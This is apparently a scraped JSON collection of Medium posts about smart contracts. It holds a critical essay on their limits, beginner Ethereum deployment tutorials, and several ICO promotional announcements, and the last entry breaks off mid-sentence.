[{"title": "The Truth about Smart Contracts", "author_name": "Jimmy Song", "link": "https://medium.com/@jimmysong/the-truth-about-smart-contracts-ae825271811f?source=search_post---------0", "post_date": "Jun 11, 2018", "readtime": "9 min read", "upvotes": "20K", "content": "The Truth about Smart ContractsJimmy SongBlockedUnblockFollowFollowingJun 11, 2018Much like the words \u201cblockchain\u201d, \u201cAI\u201d and \u201ccloud\u201d, \u201csmart contract\u201d is one of those phrases that get a lot of hype.After all, what can be better than being able to trust what will happen instead of using the judicial system? The promises of smart contracts include:Enforcing contracts automatically, trustlessly and impartiallyTaking out the middle men in contract construction, contract execution and contract enforcement(By implication) Removing lawyersI sympathize with the hype. After all, how much more efficient could things be if we could just remove the need for trusting the other party to execute?What the heck is a smart contract, anyway? And isn\u2019t that the domain of Ethereum? Isn\u2019t this the way of the future? Why would you stand in the way of progress?In this article, I\u2019m going to examine what smart contracts are and the engineering reality that goes with it (spoiler: it\u2019s not so simple and very hard to secure).What is a Smart Contract?A normal contract is an agreement between two or more parties that binds them to something in the future. Alice may pay Bob some money in return for use of Bob\u2019s house (aka rent). Charlie may agree to repair any damage to Denise\u2019s car in the future in return for a monthly payment (aka car insurance).What\u2019s different about a \u201csmart\u201d contract is that the conditions are both evaluated and executed by computer code\u00a0making\u00a0it\u00a0trustless. So if Alice agrees to pay Bob $500 for a couch for delivery 3 months from now (aka couch future), some code can determine whether the conditions are true (has Alice paid Bob? has it been 3 months yet?) and do the execution (deliver the couch from escrow)\u00a0without\u00a0giving\u00a0either\u00a0party\u00a0the\u00a0ability\u00a0to\u00a0back\u00a0out.The key feature of a smart contract is that it has trustless execution. That is, you don\u2019t need to rely on a third party to execute various conditions. Instead of relying on the other party to make good on their word or even worse, relying on lawyers and the legal system to remedy things should something go wrong, a smart contract executes what\u2019s supposed to happen timely and objectively.Smart Contracts are Pretty\u00a0DumbThe use of the word \u201csmart\u201d implies that these contracts have some innate intelligence. They don\u2019t. The smart part of the contract is in not needing the other party\u2019s cooperation to execute the agreement. Instead of having to kick out the renters that aren\u2019t paying, a \u201csmart\u201d contract would lock the non-paying renters out of their apartment. The execution of the agreed-to consequences are what make smart contracts powerful, not in the contracts innate intelligence.A truly intelligent contract would take into account all the extenuating circumstances, look at the spirit of the contract and make rulings that are fair even in the most murky of circumstances. In other words, a truly smart contract would act like a really good judge. Instead, a \u201csmart contract\u201d in this context is not intelligent at all. It\u2019s actually very rules based and follows the rules down to a T and can\u2019t take any secondary considerations or the \u201cspirit\u201d of the law into account.In other words, making a contract trustless means that we really can\u2019t have any room for ambiguity, which brings up the next problem.Smart Contracts are Really\u00a0HardBecause of a lot of centralized marketing from Ethereum, there\u2019s a mistaken belief that Smart Contracts only exist in Ethereum. This is not true. Bitcoin has had, from the very beginning in 2009, a pretty extensive smart contract language called Script. In fact, smart contracts existed before Bitcoin as far back as 1995. The difference between Bitcoin\u2019s smart contract language and Ethereum\u2019s is that Ethereum\u2019s is Turing-complete. That is, Solidity (ETH\u2019s smart contract language) allows for more complicated contracts at the expense of making them more difficult to analyze.To be clear, smart contracts existed even before Bitcoin, I just like the\u00a0cartoonThere are some significant consequences of complexity. While complex contracts can allow for more complicated situations, a complex contract is also very difficult to secure. Even in normal contracts, the more complicated the contract it is, the harder it gets to enforce as complications add more uncertainty and room for interpretation. With smart contracts, security means handling every possible way in which a contract could get executed and making sure that the contract does what the authors intend.Execution in a Turing-complete context is extremely tricky and hard to analyze. Securing a Turing-complete smart contract becomes the equivalent of proving that a computer program does not have bugs. We know this is very difficult, as nearly every computer program in existence has bugs.Consider that writing normal contracts takes years of study and a very hard bar exam to be able to write competently. Smart contracts require at least that level of competence and yet currently, many are written by newbies that don\u2019t understand how secure it needs to be. This is very clear from the various contracts that have been shown to be flawed.Bitcoin\u2019s solution to this problem is to simply not have Turing-completeness. This makes the contracts easier to analyze as the possible states of the program are easier to enumerate and examine.Ethereum\u2019s solution is to place the burden on the smart-contract writers. It is up to the contract writers to make sure that the contract does what they intend.Smart Contracts Aren\u2019t Really Contracts (at least on\u00a0ETH)While leaving the responsibility of securing contracts to the writers sounds good in theory, in practice, this has had some serious centralizing consequences.Ethereum launched with the idea that \u201ccode is law\u201d. That is, a contract on Ethereum is the ultimate authority and nobody could overrule the contract. The idea was to make clear to smart contract developers that they\u2019re on their own. If you screwed up in making your own smart contract, then in a sense, you deserve it. This came to a crashing halt when the DAO event happened.DAO stands for \u201cDecentralized Autonomous Organization\u201d and a fund was created in Ethereum as a way to show what the platform could do. Users could deposit money to the DAO and get returns based on the investments that the DAO made. The decisions themselves would be crowd-sourced and decentralized. The DAO raised $150M in ETH when ETH was trading at around $20. This all sounded good in theory, but there was a problem. The code wasn\u2019t secured very well and resulted in someone figuring out a way to drain the DAO out of money.Many called the person draining the DAO of money a \u201chacker\u201d. In the sense that the \u201chacker\u201d found a way to take money from the contract in a way not intended by the creators, this is true. But in a broader sense, this was not a hacker at all, just someone that was taking advantage of the quirks in the smart contract to their advantage. This isn\u2019t very different than a creative CPA figuring out a tax loophole to save their clients money.What happened next is that Ethereum decided that code no longer is law and reverted all the money that went into the DAO. In other words, the contract writers and investors did something stupid and the Ethereum developers decided to bail them out.The fallout of this incident is well documented. Ethereum Classic was born, preserving the DAO as written and conserving the \u201ccode is law\u201d principle. In addition, developers began shying away from using the Turing-completeness property of Ethereum as it\u2019s proven to be hard to secure. ERC20 and ERC721 standards are the most frequently used smart contract templates in Ethereum and it\u2019s important to point out that both types of contracts can be written without any Turing-completeness.Smart Contracts Only Work with Digital Bearer InstrumentsEven without Turing-completeness, smart contracts sound really good. After all, who likes having to go to court to get something that rightfully belongs to them trustlessly? Isn\u2019t using a smart contract much easier\u00a0than\u00a0normal\u00a0contracts?For example, wouldn\u2019t real estate benefit from smart contracts? Alice can prove she owns the house. Bob can send money for the house and get the house in exchange. No questions of ownership, trustless, fast execution by machine, no need for judges, bureaucrats or title insurance. Sounds amazing, right?There are two problems here. The first is that smart contract execution by a centralized party is not really trustless. You still have to trust the centralized party to execute. Trustlessness is the key feature, so centralized execution doesn\u2019t really make sense. To make smart contracts really trustless, you need a platform that\u2019s actually decentralized.That leads us to the second problem. In a decentralized context, smart contracts only work if there\u2019s some definitive link between the digital version and the physical version. That is, whenever the digital version of the house changes ownership the physical version has to also change ownership. There\u2019s a need for the digital world to \u201cknow\u201d about the physical world. This is known as the \u201cOracle problem\u201d.When Alice transfers the house to Bob, the smart contract needs to know that she actually transferred the house to Bob. There are several ways of doing this but they all have the same essential problem. There has to be some trust in some third party to verify the events in the physical world.For example, the house could be represented as a non-fungible token on Ethereum. Alice could transfer the house to Bob in an atomic swap for some amount of ETH. Here\u2019s the problem. Bob needs to trust that the token actually represents the house. There has to be some Oracle that ensures the transfer of the house token to him actually means that the house is his legally.Furthermore, even if a government authority says that the token actually represents the house, what then happens if the token is stolen? Does the house now belong to the thief? What if the token is lost? Is the house not available to be sold anymore? Can the house token be re-issued? If so, by whom?There is an intractable problem in linking a digital to a physical asset whether it be fruit, cars or houses at least in a decentralized context. Physical assets are regulated by the jurisdiction you happen to be in and this means they are in a sense trusting something in addition to the smart contract you\u2019ve created. This means that possession in a smart contract doesn\u2019t necessarily mean possession in the real world and suffers from the same trust problem as normal contracts. A smart contract that trusts a third party removes the killer feature of trustlessness.Even digital assets like ebooks, health records or movies suffer from the same problem. The \u201crights\u201d to these these digital assets are ultimately decided by some other authority and an Oracle needs to be trusted.And in this light, Oracles are just dumbed down versions of judges. Instead of getting machine-only execution and simplified enforcement, what you actually get is the complexity of having to encode all possible outcomes with the subjectivity and risk of human judgment. In other words, by making a contract \u201csmart\u201d, you\u2019ve drastically made it more complex to write while\u00a0still\u00a0having\u00a0to\u00a0trust\u00a0someone.The only things that can work without an Oracle are digital bearer instruments. Essentially, both sides of the trade need to not just be digital, but be bearer instruments. That is, ownership of the token cannot have dependencies outside of the smart contracting platform. Only when a smart contract has digital bearer instruments can a smart contract really be trustless.ConclusionI wish smart contracts could be more useful than they actually are. Unfortunately, much of what we humans think of as contracts bring in a whole bunch of assumptions and established case law that don\u2019t need to be explicitly stated.Furthermore, it turns out utilizing Turing completeness is an easy way to screw up and cause all sorts of unintended behavior. We should be labeling smart contract platforms Turing-vulnerable, not Turing-complete. The DAO incident also proved that there\u2019s a \u201cspirit\u201d of the contract which is implicitly trusted and helps resolve disputes more so than we realize.Smart contracts are simply too easy to screw up, too difficult to secure, too hard to make trustless and have too many external dependencies to work for most things. The only real place where smart contracts actually add trustlessness is with digital bearer instruments on decentralized platforms like Bitcoin.", "responses": "152"}, {"title": "Build Your First Smart\u00a0Contract", "author_name": "Gerald Nash", "link": "https://medium.com/crypto-currently/build-your-first-smart-contract-fc36a8ff50ca?source=search_post---------1", "post_date": "Dec 7, 2017", "readtime": "9 min read", "upvotes": "5.7K", "content": "Build Your First Smart\u00a0ContractA Tutorial for BeginnersGerald NashBlockedUnblockFollowFollowingDec 7, 2017If you\u2019ve seen technology news lately, you\u2019ve likely noticed that Bitcoin and other cryptocurrencies have skyrocketed in price. In just 2017 alone, Bitcoin has seen a 2035.3% increase in price at the time of this writing. And, because many coins in the cryptocurrency market are highly correlated with Bitcoin, currencies such as Ethereum and Litecoin have seen equally spectacular jumps in price. Ethereum, for example, has seen a 6365.3% increase and Litecoin a 2775.49% increase.We know that Bitcoin is the king of crypto as of today, but its primary use at the moment is solely that of a currency. This is great for day-to-day payments, but we want more functionality; we want the ability to write software that will run ontop of a large, decentralized network like Bitcoin\u2019s. To do this, we could create Bitcoin smart contracts, but Bitcoin\u2019s smart contract language is limited and not very extensible.To get our smart contracts running on a vast decentralized network, we\u2019ll create smart contracts for the Ethereum blockchain. Ethereum is special, because it\u2019s the first blockchain implementation to have a Turing Complete virtual machine built ontop of it. This means that an Ethereum smart contract can (theoretically) be used to accomplish any computational task. In more simpler terms, nearly any program can be run on of Ethereum.In this post, we\u2019ll walk through making a simple counter smart contract. The contract will be written in a programming language called Solidity, a language similar to JavaScript. Before we get started, you must have Ganache installed, which will be the tool we\u2019ll use to create a private blockchain that runs on our machine only. You\u2019ll also need to download your own copy of MyEtherWallet (the URL-hosted website won\u2019t work in this case). Note: Download etherwallet-v3.xx.x.x.zip.Once those are installed, we\u2019ll get started by going to https://remix.ethereum.org/ in our browser, where we\u2019ll see the following screen.Remix IDEThis is Remix, an online compiler for Solidity. It\u2019s what we\u2019ll use to write our smart contract code. When you first visit the page, the text editor is preloaded with some code. But, we don\u2019t need what\u2019s given, so we\u2019ll erase all of that text and replace it with the following.Counter Code (in Solidity)This is the code for our counter. As you can see, it has one variable and three functions. The variable, count\u00a0, is an integer that\u2019s private, which means that it can\u2019t be accessed by anyone outside of the contract itself. The first function, incrementCounter()\u00a0, changes, or mutates, the value of count by incrementing its value. The second function, decrementCounter()\u00a0, mutates the value of count by decrementing its value. And, the third function, getCount()\u00a0, accesses count and returns its value to whoever or whatever called the function.When the counter code is pasted into Remix, it should look like the following and automatically compile.Remix with Contract\u00a0CodeWe\u2019ll leave that tab open so that we can return to it later. Now, open Ganache and you\u2019ll see something like this.Near the top of the screen, you can see text that says \u201cRPC SERVER\u201d. We\u2019ll need it soon.Now, unzip your MyEtherWallet download and open the folder. Then, open the index.html file in your browser to see the following screen.In the top right corner, you can see a dropdown that tells MyEtherWallet what Ethereum network to connect to. By default, it connects to the Ethereum (ETH) main network (mainnet). We want to change this by clicking the dropdown.Click \u201cAdd Custom Node\u201d.Now you can input the RPC Server information that Ganache gave us earlier. Note: You can name your node whatever you\u2019d like.MyEtherWallet is now connected to your self-hosted blockchain through Ganache. Let\u2019s use MyEtherWallet to upload our Counter smart contract to our blockchain. To do this, we\u2019ll click \u201cContracts\u201d in MyEtherWallet\u2019s top navigation bar and select \u201cDeploy Contract\u201d.As you can see, MyEtherWallet asks us for the contract\u2019s byte code. To locate this, we\u2019ll go back to our Remix IDE and click the \u201cDetails\u201d button.You should now see a dialog with a lot of information about our Counter contract.To copy the byte code, we\u2019ll click the clipboard icon next to \u201cBYTECODE\u201d.Then, we\u2019ll go back to MyEtherWallet and paste the byte code into the dialog.Now we can scroll down and import an account to upload the contract with. Luckily, Ganache gave us 5 addresses that we can use to interact with our private blockchain. To use one of them to upload this contract, we can go back to Ganache and click the key icon for any of the addresses.It\u2019ll show us the private key associated with this account.This money is fake, so I\u2019m comfortable showing the private key, but always be\u00a0careful!We can copy this private key and paste it into MyEtherWallet.Now if we click \u201cUnlock\u201d, MyEtherWallet will ask us if we want to sign this transaction and deploy our contract. We do.Click Yes!If the transaction occurred successfully, then Ganache will increment its \u201cCurrent Block\u201d value and the transaction count of the account that we used to deploy the contract also increment.Our contract is now uploaded to our blockchain! To interact with it by incrementing and decrementing the counter, we can go back to MyEtherWallet and select \u201cInteract With Contract\u201d.MyEtherWallet now asks for the address at which our newly deployed contract resides and the Application Binary Interface (ABI) of our contract. To find the contract address, we can go back to Ganache and view our transactions log.This page shows us the transaction that we\u2019d created earlier when we deployed our contract. As you can see, Ganache tells us the address we\u2019d used to deploy the contract, the address of the contract on our blockchain, and more information about the transaction. Let\u2019s click the transaction, copy the created contract address, and paste it into MyEtherWallet.All that\u2019s left that we need is the ABI. This is what tells MyEtherWallet how to interact with our contract. To get it, we\u2019ll go back to Remix and click the clipboard icon next to \u201cINTERFACE - ABI\u201d to copy it.Now we can go back to MyEtherWallet, paste the ABI into its text box, and click the \u201cAccess\u201d button.Awesome! Now we can interact with our contract by clicking the \u201cSelect a function\u201d dropdown.In our code, we set count \u2018s initial value to 0. To confirm that the contract is working properly, let\u2019s call the getCount() function.It worked! Our contract returned 0 when getting the value of count before changing it. But, we also made two other functions, incrementCounter() and decrementCounter()\u00a0. Let\u2019s call incrementCounter() to test it. We\u2019ll do this by selecting the function dropdown again, selecting incrementCounter\u00a0, and creating a new transaction.This just incremented the value of count\u00a0. Now we can call getCount() again to confirm whether the value actually changed.As you can see, count is now equal to 1! So, our incrementCount() function works. You are free to test decrementCount()\u00a0, yourself, and explore even more!", "responses": "33"}, {"title": "New Smart Contract on\u00a0Github", "author_name": "Ternion Team", "link": "https://medium.com/ternion/new-smart-contract-on-github-84425451e6b0?source=search_post---------2", "post_date": "Jul 19, 2018", "readtime": "", "upvotes": "962", "content": "New Smart Contract on\u00a0GithubTernion TeamBlockedUnblockFollowFollowingJul 19, 2018After the launch of the Bounty program, we have been receiving multiple suggestions and commentaries about our ecosystem and technical solution. We took all of Your suggestions into account and we are releasing a new version of the Smart Contract on Github. Version 0.4 found be found here on Github.We are adding new functions, which raises the security of Ternion and makes the process even more transparent.Some old functions which were non efficient were deleted or replaced.The smart contract is available on GitHub.The Ternion Smart Contract is not yet online in the Ethereum network and shall be publicly edited upon further development of the ecosystem.In the case of a successful Token Sale ( The reach of the Soft Cap), there shall be a final audit of the contract conducted and the public release date shall be settled.If the project is not be able to reach its Soft Cap, the funds raised shall be returned back to the contributors and the contract shall not be launched.Thank you for you support!Follow us on other social media for more updates:Facebook https://www.facebook.com/ternionofficial/Telegram Chat\u200a\u2014\u200ahttps://t.me/TernionOfficialTelegram Channel for announcements\u200a\u2014\u200ahttps://t.me/TernionAnnouncementsTwitter\u200a\u2014\u200ahttps://twitter.com/ternionofficialLinkedIn\u200a\u2014\u200ahttps://www.linkedin.com/company/ternionofficial/", "responses": "12"}, {"title": "Future of Work: Connecting the Real and Digital Worlds via Smart Contract\u00a0Events", "author_name": "Ben Stewart", "link": "https://medium.com/blackboxtoken/future-of-work-connecting-the-real-and-digital-worlds-via-smart-contract-events-7d924a21d22d?source=search_post---------3", "post_date": "Jul 3, 2018", "readtime": "7 min read", "upvotes": "6.8K", "content": "Future of Work: Connecting the Real and Digital Worlds via Smart Contract\u00a0EventsBen StewartBlockedUnblockFollowFollowingJul 3, 2018The future workforce will not be composed of employees, it will be powered by contributors.As I rub my crystal ball and look into the future, organizations will continue to become increasingly efficient and data will drive decisions. Individual value-add will be a dynamic metric that serves as the basis for compensation, reputation, and seniority.Employees vs. ContributorsBut what\u2019s the difference between an employee and a contributor? In short, contributors add value and that value is easy to assess. That\u2019s not always the case with the traditional employee. Plagued by repetitive work, inconsistent or subjective expectations, lack of feedback and growth opportunities, it\u2019s evident why a large percentage of the current workforce is disengaged and inefficient.This problem has been building for decades with the downstream consequences of traditional, top-down organizational structures.But it gets worse. Pairing our antiquated way of thinking and operating with the advancements being made in artificial intelligence and other forefront technologies could result in a majority of the global workforce losing employment and/or being unqualified because of factors that are out of their control.To gain resiliency against record high unemployment, restricted access to opportunity, and wider income inequality, we have to change our way of thinking.Reimagining what an organization is at its\u00a0coreWe must build tools that foster and grow contributor culture while making it easier for everyone to provide the best work of their life thus unlocking new opportunity, happiness, and growth.But how do we do that? How can we use current technologies to build for the future of\u00a0work?Over time, our approach, architecture, and processes will change and as an organization with hundreds of years of collective technology experience, we realize that for evolution to take place, we must start somewhere.So let\u2019s abstract away all these concepts of cryptographic hash functions, decentralized autonomous organizations, or anything else you\u2019ve heard to describe the next best thing in technology. We want to focus on one core area required for the future of work without being distracted by all the noise. Let\u2019s take things back to the basics\u2026Decentralized CollaborationThe future of work will require further emphasis on decentralized collaboration. Organizations don\u2019t operate in a bubble and the sooner we embrace this, the sooner we can start improving the experience. The bubble popped a long time ago and we need to focus on the centerpiece of collaboration, communication.CommunicationWe, as humans, tend to think about communication in an asynchronous, interpersonal way. For example, Bob told Janet about his weekend and she responded with a similar recap of the last couple days.When we think about this in an organizational setting, we suffer from the same inefficiencies but they are often magnified due to unidirectional, top down management structures. But communication shouldn\u2019t be built around this idea of funneling information.In the future of work, we think about communication as the exchange of information. This exchange occurs between people, between systems, and between people and systems.As a contributor, you have a one-to-many relationship with these information sources and which requires a more flexible, efficient approach to accessing what you need to know.A system, on the other hand, has a many to many relationship with information sources coming from all angles and it runs the spectrum of data types. Some information only lives in a smart contract while other information is a real world event or even in the form of expertise within a senior contributor\u2019s brain.At the end of the day, information is our lifeblood and it needs to be easily exchanged to streamline communication. The first step is accessing this information.Build a bridge from the physical to the digital\u00a0worldTechnology disclaimer: we are Ethereum advocates. We realize that technologies come and go with time but for our current efforts, we have found the platform to be a suitable solution.Smart contracts are an extremely powerful tool because they allow us to blend the real world with a digital one. Much like people having a conversation, data communicates in a variety of ways. In the future of work, all forms of communication will become more efficient. Information should not exist in a silo and/or without responsibility. Our goal is to enable information to reach new levels of utilization.So, let\u2019s build our bridge between worlds. Since we are Ethereum advocates and have Solidity on our tool-belt, we have been blessed with this idea of \u201cevents\u201d within smart contracts. Events allow on-chain transactions to communicate with off-chain services in the \u201creal\u201d world.Smart contracts have the ability to emit events while processing a transaction. Of note, a transaction must first be mined before the event information becomes available.At a deeper level, events take advantage of the EVM logging facilities and can be used to trigger JavaScript callbacks. Read more about it here in the Solidity documentation. We will be showcasing this flow in more detail below.To start, we will create a lightweight contributor smart contract that allows us to set the name of a contributor:When setContributor() is initiated, an event is createdCreating events is pretty straightforward in Solidity. This lightweight example fires an event when we set the contributor\u2019s name (L16). We are now emitting events from Solidity which may seem basic but it unlocks a world of possibilities. We can now leverage a transactional based model for notifications, back end processes, or whatever else our heart desires to be triggered from a transaction.But emitting events is just the first part. We need to make sure that we are listening for them. This is the second piece of the puzzle and now you can see how this begins to resemble the observer software design pattern.Think about this in the context of a contributor change or creation event (an area that is extremely relevant to the future of work). We can trigger an action to be enqueued based on a new contributor being added to ecosystem or an existing member being updated. This allows us to assign individual skill levels, determine reputation, and queue notifications.For our example, we will still use the contributor contract from above and we will assume that upon the contributor creation event, we need to update the UI. Keep in mind that events can be leveraged on a wide spectrum of downstream actions with the appropriate listener, but we will keep this brief.We use JavaScript (Web3) to interact with a smart contract via a local or remote Ethereum node on the client side. To do this, we must first create a variable to reference our event. We can just make the below addition to our existing front end code:var contributorEvent = ContributorContract.Contributor();Now that we have our variable setup, we can leverage the\u00a0.watch() method on contributorEvent with a callback.Essentially, if there is no error, we can update the UI to do as we please. Basic examples of this include hiding, showing, or updating different elements of the page. We have now bridged the gap between on and off chain communication.This basic end to end flow showcases how we can communicate on chain transactions to off chain services. We use this flow to pragmatically build complex, event-based functionality. Adding new contributors, compensating project contributors, and surfacing notifications are a few areas that we leverage some form of event driven architecture.Wrapping it\u00a0upThe evolution of communication started 500,000 years ago with the origin of speech. From origination, we\u2019ve made the exchange of information more dynamic, efficient, and fluid. Why stop now?The future of work is upon us and we have to listen, react, and respond to information that exists in both the physical and digital worlds. Sounds a lot like an event\u00a0;)The exchange of information is just one area that can be improved with blockchain technologies and events give us great power to seamlessly connect people, machines, and worlds.If you would like to learn more about the Future of Work, JOIN US.Stay Tuned,Ben StewartSources:\u00a0https://github.com/ethereum/wiki/wiki/JavaScript-API#watch-callback-return-valuehttp://solidity.readthedocs.io/en/latest/contracts.html#eventshttps://en.wikipedia.org/wiki/History_of_communicationhttps://coursetro.com/posts/code/100/Solidity-Events-Tutorial---Using-Web3.js-to-Listen-for-Smart-Contract-Eventshttps://medium.com/hello-sugoi/ethereum-communicating-with-the-off-chain-world-789fea13163b", "responses": "1"}, {"title": "Build Your First Ethereum Smart Contract with Solidity\u200a\u2014\u00a0Tutorial", "author_name": "Pete Humiston", "link": "https://codeburst.io/build-your-first-ethereum-smart-contract-with-solidity-tutorial-94171d6b1c4b?source=search_post---------4", "post_date": "Nov 12, 2017", "readtime": "24 min read", "upvotes": "5.2K", "content": "Build Your First Ethereum Smart Contract with Solidity\u200a\u2014\u00a0TutorialPete HumistonBlockedUnblockFollowFollowingNov 12, 2017So you wanna build a smart contract? Perhaps you want to understand how they work, maybe you want to build your own Dapp, maybe you want to launch the very first billion dollar ICO (sarcasm)... Regardless of your intentions, learning how smart contracts work is invaluable. The Ethereum platform possesses enormous potential to create Dapps that could change the way we interact on the web in the decades to come. While Ethereum deploys smart contracts that work much like a standard blockchain transaction, they yield a conditional statement that must be met before a function(s) is executed. Smart contracts can be used for voting, crowdfunding, blind auctions, multi-signature wallets and MUCH more.", "responses": "67"}, {"title": "Advantages Of NEO Smart Contract For Asura\u00a0Coin", "author_name": "Asura World", "link": "https://medium.com/@asuracoin/advantages-of-neo-smart-contract-for-asura-coin-6c734081aec3?source=search_post---------5", "post_date": "Mar 4, 2018", "readtime": "3 min read", "upvotes": "438", "content": "Advantages Of NEO Smart Contract For Asura\u00a0CoinAsura WorldBlockedUnblockFollowFollowingMar 4, 2018By now a lot of the Crypto community around the world would\u2019ve heard of NEO, some NEO ICOs, NEO technology and/or other information pertaining to NEO.It\u2019s fair to say that NEO is very new compared to Ethereum and being new, the general knowledge of NEO is also quite shallow. However, when asked to some people that follow NEO lightly about what they know about the Technology and Token, the answer is usually: \u201cOh I heard it\u2019s Chinese blockchain technology\u201d\u00a0, \u201cI heard it\u2019s faster and more reliable\u201d\u00a0, and so on in similar context.Although not false, but it\u2019s a very basic understanding that does not shed much light to the fundamentals. We look at the NEO Smart Contract, as a one of the core characteristics of blockchain technologies.NEO Smart\u00a0ContractIn brief, a smart contract is a set of responsibilities that are set out digitally, including the agreement on how contract participants shall fulfill these responsibilities. Because of the way how a smart contract operates, it requires a high level of trust, thus blockchain technology goes hand in hand with smart contracts as it provides that highly trustworthy system in a decentralized environment.The Neo Smart Contract actually has 3 different types: validation contracts, function contracts, and application contracts. However all have in common: high performance, expandability and certainty.Behind The SceneThe foundation, NEO, uses the lightweight NeoVM (NEO Virtual Machine), a virtual machine is an emulation of a computer system, in this case, a \u201cNEO computer\u201d. The NeoVM provides the environment for contract executions, it starts very fast and only takes up a small amount of resources. This makes it particularly suitable for short procedures of smart contracts.NEO also uses something called a Static Compilation. A Static Compilation has three main advantages:Static compilation yields more powerful deployed applications.Static compilation provides better intellectual property protection.Static compilation achieves greatly reduced start-up cost, reduced memory usage, and easier linking with native code.NeoVM\u2019s data manipulation (adding, deleting, updating, and modifying data in a database) instructions provide support for arrays and complex data structures directly.NEO Smart Contracts are also known for scalability, through two procedures known as concurrency and dynamic partitioning.Concurrency\u200a\u2014\u200athis allows NEO Smart Contracts to execute different parts of a program, or algorithm out-of-order or in partial order, without affecting the final outcome.Dynamic Partitioning\u200a\u2014\u200athis allows NEO Smart Contracts to reassign processors and memory to specific applications whenever without the need to shut down. With the Smart Contract, this procedure would occur automatically based on application trafficThese functions all add to the enhancement of performance in NEO Smart Contracts and that in hand are all advantages for the Asura Coin Smart Contract. More reasons why NEO is more suitable for the Asura World platform.For more information on the Asura Coin ICOWebsite: https://asuracoin.ioTwitter: https://twitter.com/asuracoinFacebook: https://facebook.com/asuracoinReddit: https://www.reddit.com/r/AsuraCoinTelegram: https://t.me/asuracoin", "responses": "4"}, {"title": "Smart Contracts for\u00a0Dummies", "author_name": "Nik Custodio", "link": "https://medium.freecodecamp.org/smart-contracts-for-dummies-a1ba1e0b9575?source=search_post---------6", "post_date": "May 26, 2017", "readtime": "7 min read", "upvotes": "2.9K", "content": "Smart Contracts for\u00a0DummiesIf you still don\u2019t get what the heck a Smart Contract\u00a0is\u2026Nik CustodioBlockedUnblockFollowFollowingMay 26, 2017Ok, you know a bit about Bitcoin (see: Explain Bitcoin Like I\u2019m Five). You\u2019ve been seeing the blockchain on the news.But what\u2019s this new Ethereum thing? Apparently it\u2019s this crypto-currency you can use to build \u201csmart contracts\u201d. Sounds impressive. So, uh\u2026 what are they again? (Spoiler: They\u2019re not that smart. And they\u2019re not really contracts!)Instead of a one line definition, let\u2019s try to get an intuition. First, we\u2019ll revisit the blockchain and the word \u201ctrust\u201d. Then, we\u2019ll talk about the word \u201ccontract\u201d. Understanding both words is the secret.Part I: What we mean by \u201cTrust(less)\u201dMost of the time, when we think Bitcoin (or Ethereum), we have a mental image of, well\u2026coins.Aren\u2019t these crypto-currencies after all? Isn\u2019t that the whole point? In our minds we see objects\u200a\u2014\u200adigital gold, or silver (or tulips for the skeptics).Because these images are easy to understand, we forget a bit about that thing that\u2019s underneath it all. So, I say we start thinking about this in a different way.Digital StoneUgh, really? Digital rocks? Actually, rocks are pretty useful.We have this idiom in the english language that goes something like this: \u201cset it in stone.\u201d\u201cI\u2019ve reviewed the contract Bob. Looks good. Let\u2019s set this in\u00a0stone!\u201d\u201cDon\u2019t get too excited Alice, nothing\u2019s in stone\u00a0yet.\u201d\u201cThis is God. I\u2019ve written my 10 commandments on these two stone tablets. You know. Just in case ya'll start getting any funny\u00a0ideas.\u201dThis metaphor continues to have meaning in a modern world because in the physical (ancient) world, stone had some interesting properties:When you carve something on stone there is a physical finality and permanence to it. You can\u2019t make changes just like that.If you try to \u201cerase\u201d something later on, it\u2019ll be obvious. Any changes you make to it are quite transparent and tamper proof (provable).These rules apply equally to all. Stone is neutral. It obeys the laws of physics, not men. It doesn\u2019t care if you\u2019re a powerful king or a peasant\u200a\u2014\u200ait behaves exactly the same for everyone.Because of all these properties, we have a pretty high level of trust in stone.I mean\u200a\u2014\u200athere\u2019s a reason why we never say \u201clet\u2019s set this agreement in sand.\u201d Stone is the kind of thing I can point to in the future for evidence. Stone equals solid proof\u200a\u2014\u200anot just any material will do!The Economist agrees!When it comes down to it, a blockchain is really just the above: a kind of material that, through a special mix of cryptography and decentralization, has the properties of permanence, transparency, and neutrality\u200a\u2014\u200awhatever you put on it.Whether it\u2019s a list of how many apples you sent to Joe. Or the words \u201cI love Jenny.\u201d It doesn\u2019t matter. When you put it on a blockchain\u200a\u2014\u200ait\u2019s on.Setting something on a blockchain is like setting something in stone. It makes trust\u00a0easier.Except now we can do it digitally. And that\u2019s pretty special.Thinking about a blockchain as a piece of stone you can write things on (instead of a piece of currency) also helps us understand its broad potential. Which leads us to\u2026contracts!", "responses": "15"}, {"title": "Smart contract and Crosspays.", "author_name": "CROSSPAYS", "link": "https://medium.com/@crosspays/smart-contract-and-crosspays-23d6618eec8b?source=search_post---------7", "post_date": "Apr 23, 2018", "readtime": "", "upvotes": "712", "content": "Smart contract and Crosspays.CROSSPAYSBlockedUnblockFollowFollowingApr 23, 2018The Internet is full of stories of fraud and deception\u200a\u2014\u200aboth intentional and unintentional, the victims of which are users of \u201ctraditional\u201d trading platforms. Those people are suggested to fight independently with intruders, dishonest sellers, learn to identify the criminal intentions of counterparties during prepayment, operations with bank cards, transactions with real estate, cars and so on.In case of financial or material losses of the User, the Marketplace eliminates, leaving the User with his problems and without money. Crosspays relieves its users of all listed and similar risks. Now the interaction of sellers and buyers completely passes into the white zone.Crosspays simplified the use of the Smart Contract in everyday life: ads or user contracts are collected as a designer\u200a\u2014\u200aUsers simply select the necessary options and the ready contract appears in the Blockchain.To scammers it becomes simply unprofitable to deceive the respectable Entrepreneurs and Consumers\u200a\u2014\u200ain case of deceit, their deposit is blocked by Smart Contract and transfers to the income of the Crosspays Community.All the key history of transactions, trade and social relations between participants is recorded in a public chain of blocks and paralyzes the work of dishonest sellers, buyers and users.That\u2019s why Crosspays is reliable and acts as the guarantor of any transactions, the first in the world allows the Community members\u200a\u2014\u200aEntrepreneurs and Consumers of goods and services to deposit funds through Smart contracts in any crypto-currencies and fiat money before the successful completion of transactions.", "responses": "14"}, {"title": "Insurtech GRE\u2019s smart-contract DLT enables P&C insurers to reach the new market segments. Exclusive interview with @AXALab and GRE @GRE_RISK\u00a0:", "author_name": "Global Risk Exchange", "link": "https://medium.com/@foundation.gre/insurtech-gres-smart-contract-dlt-enables-p-c-insurers-to-reach-the-new-market-segments-f25225fd01a7?source=search_post---------8", "post_date": "Apr 19, 2018", "readtime": "4 min read", "upvotes": "428", "content": "Insurtech GRE\u2019s smart-contract DLT enables P&C insurers to reach the new market segments. Exclusive interview with @AXALab and GRE @GRE_RISK\u00a0:Global Risk ExchangeBlockedUnblockFollowFollowingApr 19, 2018Source: DigFin Group https://www.digfingroup.com/gre/?from=singlemessage&isappinstalled=0AXA Lab Asia is in talks with 